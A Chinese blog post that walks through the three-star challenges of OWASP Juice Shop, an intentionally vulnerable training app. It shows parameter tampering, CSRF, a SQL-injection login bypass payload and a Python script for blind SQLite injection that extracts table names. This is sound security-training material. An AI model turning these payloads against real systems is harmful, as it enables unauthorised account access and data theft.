---
layout: post
title:  "owasp juice shop"
subtitle: '三星难度'
date:   2020-09-21 18:00:00
tags: 靶场
description: '靶场'
color: 'rgb(255,140,0)'
cover: 'https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200914161540665.png'
---

## 0x01 前言

这篇介绍3星题目，前两篇都没有什么技巧，这篇还是有点东西的。

![image-20200922001307653](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200922001307653.png)

## 0x02 3星题目

### Admin Registration

注册一个拥有管理员权限的用户。

通过观察注册流程发现，注册时并没有相关关于权限的参数，但是返回包确存在一个相关参数**role**，这里就体现英语的作用了，这个单词的意思是角色。在这里卡了一会，看了三遍才发现。。

![image-20200918230426927](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200918230426927.png)

既然注册会返回这个值，那么我们就尝试在注册时带入这个值。

![image-20200918232358757](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200918232358757.png)

然后就自动会跳杯。



### Bjoern's Favorite Pet

通过忘记密码功能和原始安全问题答案重置Bjoern's OWASP账户的密码。

先需要确定Bjoern用户账户，直接到后台查看。当然如果是正常流程，则需要去信息收集。然后直接拿着这个账户搜索即可。

![image-20200918235412903](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200918235412903.png)



### CAPTCHA Bypass

在 10 秒内提交 10个或更多的客户反馈。

提交反馈处，抓包卡着不放行。然后发送到inturder模块，请求10次即可。

![image-20200919000017914](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200919000017914.png)



### CSRF

使用跨站点请求伪造从 另一个来源(http://htmledit.squarefree.com)更改用户的名字。

就是从指定来源更新某个用户的用户名，登录一个账户。

因为这里用docker部署在国内，导致一些页面加载巨卡，主要是加载https://getmdl.io/这个玩意花了时间。然后把环境迁移到herokuapp上了。这里直接使用Burp生成csrf页面

![image-20200919002448811](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200919002448811.png)

然后打开htmledit.squarefree.com，将POC代码黏贴进去。这个网站是在线编辑html的。

![image-20200919002607148](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200919002607148.png)

然后就发现报错了。好像是因为什么安全机制拦截了吧。在herokuapp中查看应用log。发现已以下报错内容

![image-20200919003717716](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200919003717716.png)

```
Error: Blocked illegal activity by ::ffff:10.183.68.6
Error [ERR_HTTP_HEADERS_SENT]: Cannot set headers after they are sent to the client
```

找了下说好像是后端的问题，不在继续跟进了，毕竟CSRF的验证也很简单。



### Database Schema

通过SQL注入获取整个数据库结构。

这个没啥好说，找个注入点，然后拿sqlmap跑就行了。当然初学者建议手工试一试，理解理解sql语句的构造及作用。抓包跑的时候就发现存在问题了。登录框那里去跑会报401错误。只需要加一个参数就行了，忽略401错误。**--ignore-code 401**

然鹅还是跑不出来，眉头一皱发觉此事不简单，抓包看了一下，是SQLLTE数据库

![image-20200920105236498](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920105236498.png)

然后就开始准备手工注入，正常就返回一个登录成功的tocken，否则就返回无效的邮箱或密码。

![image-20200920105904921](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920105904921.png)

![image-20200920110010050](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920110010050.png)

直接放到bp的重放模块，然后把对应值给替换掉，载荷就a-z，A-Z，0-9，-_。希望后端数据库命名没有其他特殊字符。。

![image-20200920110720873](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920110720873.png)

接下来的过程就比较无趣了，只是有个问题，这个样子跑，速度有点慢。想用二分法发现这玩意没有ascii函数。没啥好方法了写个脚本跑一下。

`select count(name) from sqlite_master where type='table'` 

先手动判断了下总共有多少个表。总共有21个表。

然后写了一个脚本去跑这个表结构。

```python
# pythpon3

import requests

payload1 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789-_"

sql = "length(select name from sqlite_master where type='table' limit %s,1) = %s"
sql2 = "substr((select name from sqlite_master where type='table' limit %s,1),%s,1)=%s"

for t in range(0,22):
	tt = ''
	for i in range(1,21):
		data  = {"email":"' or length((select name from sqlite_master where type='table' limit %s,1)) = %i -- " %(t,i),"password":"123456"} 
		# print(data)
		r = requests.post('http://xx.xx.xx.1:3000//rest/user/login', data = data)
		if len(r.text) > 300:
			print(i)
			continue
	q = i
	for l in range(1,q+1):
		for p in payload1:
			data = {"email":"' or substr((select name from sqlite_master where type='table' limit %s,1),%s,1)= '%s' -- " %(t,l,p),"password":"123456"} 
			r = requests.post('http://xx.xx.xx.1:3000//rest/user/login', data = data)
			if len(r.text) > 300:
				tt = tt + p
				print(tt)
				continue
```

![image-20200920145716973](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920145716973.png)

依旧是慢的很，而且并不会跳杯，那么说明这个题目应该还有其他的注入点。搜索框？直接拿sqlmap跑跑看，这里有个问题链接中有个#号，会导致sqlmap识别不出来注入点。但是把这个符号给删除掉，好像也会出现问题。。。后来抓包发现这个请求是这样的/rest/products/search?q=juice。使用sqlmap依旧是跑不出来，因为sqlmap并没有把服务器返回的500错误加入判断，所以有问题。

![image-20200920153011264](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920153011264.png)

这里需要注意，直接改包路面的参数是不行的，需要把空格使用%20代替掉，或者去params改参数。

![image-20200920154426218](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920154426218.png)

sqlite_master表是SQLite的系统表。该表记录该数据库中保存的表、索引、视图、和触发器信息。每一行记录一个项目。在创建一个SQLIte数据库的时候，该表会自动创建。sqlite_master表包含5列。

 

type列记录了项目的类型，如table、index、view、trigger。

name列记录了项目的名称，如表名、索引名等。

tbl_name列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。

rootpage列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。

sql列记录创建该项目的SQL语句。

这里需要读取sql这列的值即可成功跳杯。



### Deluxe Fraud

无需付费的高级会员资格

进入高级会员页面，开始跟踪流程，发现随便添加张卡就成为了高级会员，但是并没有跳杯。观察后发现是通过这种方式进行判断支付的，因为这里并没有什么其他的校检，所以尝试随便输入其他的就可以跳杯了。

![image-20200920162609980](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920162609980.png)



### Forged Feedback

以另一个用户名发布一些反馈

在发送反馈页面提交处，发现存在一个有意思的参数：**userid**。所以直接改就好了。

![image-20200920164349268](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920164349268.png)



### Forged Review

以另一个用户名义发布商品评论或者编辑任何已有的用户评论

在商品处添加评论，观察请求与响应包，修改PUT请求中的值后，会以admin@juice-sh.op发布一个1111的评论。即可跳杯。

![image-20200920164928372](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920164928372.png)



### GDPR Data Erasure

使用已删除的Chris用户帐户登录

首先需要这个用户是谁，需要通过sql注入可以获取这用户名。在登录注册地方的sql语句给了一个信息，deletedAt列控制必须是空值。

![image-20200920170958967](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920170958967.png)

so，构造一下sql语句。即可跳杯

![image-20200920171247533](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920171247533.png)



### Login Amy

使用Amy的原始用户凭据登录。(这可能要花费938.3万亿亿亿世纪的才能暴力破解，但幸运的是她没有读过“最后的重要提示”)

然而在注册过程中并没有发现什么最后的重要提示。从提示中可以发现几个关键信息。用户的外星人老公Kif。密码策略不行，另外就是需要很长时间破解。那么这应该是要结合用户情况去产生密码。

最后经过度娘的指导，找到了这个测试密码强度的页面。其中就有最后的提示。

![image-20200920172916441](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920172916441.png)

so，最后Amy这个用户密码是**K1f.....................**



### Login Bender

登录Bender的用户帐户

在登录口输入`bender@juice-sh.op' --` 然后点击登录就能跳杯。



### Login Jim

用Jim这个用户登录

通过提示说明，这个推荐使用密码hash破解去登陆，那么现在就是如何获取这个hash了。可以通过sql注入获取这个hash。e541ca7ecf72b8d1286474fc613e5e45。解出来是ncc-1701，然后登录即可。



### Manipulate Basket

将额外商品放入另一个用户的购物车

首先观察商品添加购物车的请求包，可以看到有一个购物车参数。尝试修改参数进行提交。

![image-20200920190813626](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920190813626.png)

可以看到被阻断了。

![image-20200920191029513](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920191029513.png)

尝试多参数进行提交。只是对了第一个参数进行判断，添加成功。跳杯。

![image-20200920191232011](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920191232011.png)



### Payback Time

提交一个让你变得更富有的订单

so，根据提示，是让商场倒贴钱。添加商品，抓包修改数量那一栏。然后下单支付，就会跳杯。

![image-20200920192102880](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920192102880.png)

![image-20200920192200027](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920192200027.png)



### Privacy Policy Inspection

证明您实际上阅读了我们的隐私政策。

根据提示，访问隐私页面，在鼠标滑动过程中会有些字符存在火光效果，然后拼接起来即可。虽然隐私政策确实需要认真的读，但是现阶段哪来的隐私。审查元素发现就能发现关键样式**hot**。

![image-20200920193222080](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920193222080.png)

```
最后拼接起来就是http://xx.x.xx.xx:3000/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility
```

访问就会跳杯。



### Product Tampering

更改OWASP SSL高级取证工具(O-Saft)中链接的`href`为 *https://owasp.slack.com* 。

这个题的类型是失效的访问控制，这里面用了很多的api接口，在上面已经用了几个api接口，因为没有认证，所以造成越权修改数据的操作。现在就是需要找关于商品修改的api了。通过查找JS文件可以发现这个链接。

![image-20200920195249945](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920195249945.png)

把9号商品信息复制过来，直接使用PUT修改，发现报错。随后在连接后边添加了9。虽然成功提交，但是信息却没有任何修改。

![image-20200920200042312](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920200042312.png)

修改数据提交方式，成功修改。

![image-20200920200739748](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920200739748.png)



### Reset Jim's Password

通过忘记密码功能中安全问题的*原始答案*来重置Jim的密码

查看jim的忘记密码问题。翻译过来就是：你最大的兄弟姐妹的中间名。PS：正常人谁会将这种问题填写真实信息。

![image-20200920201153592](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920201153592.png)

so，又到了搜索时间。登录jim账户可以看到他的收货地址，以此为线索。

![image-20200920202011912](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920202011912.png)

![image-20200920202241275](D:\KIDICC资料库\MD图库\owasp juice shop（3）\image-20200920202241275.png)

看了看发现jim的爸爸就是James Tiberius Kirk。所以就找他大儿子。幸运的是搜索补全纠正了我。

![image-20200920203112049](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200920203112049.png)

最后使用**Samuel**重置成功。我应该爆破的。。



### Upload Size & Upload Type

上传大于 100 kB 的文件；上传一个没有pdf或者zip后缀名文件。

在投诉页面有一处提交上传文件的地方，只允许上传pdf和zip且必须在100KB以内。

![image-20200921231051674](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200921231051674.png)

是在前端进行判断，那么直接抓包替换就行了。没想到只是替换请求包中内容并不能实现跳杯，需要直接对这个上传页面进行请求，然后就行了

![image-20200922000828763](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20200922000828763.png)



## 0x03 小结

三星题目还是有点收获的，因为某些原因磕磕绊绊玩了几天。

1、权限测试时，需要关注返回包内容，可以使用返回包中的身份参数带入到请求包进行发送

2、测试时需要关注每一个参数，尝试对这些参数进行修改。多参数覆盖、参数值修改等

3、sqlite手工注入

4、js文件内容查找，api接口爆破也是很有必要的

5、歪果仁的思考方式和我们确实不一样

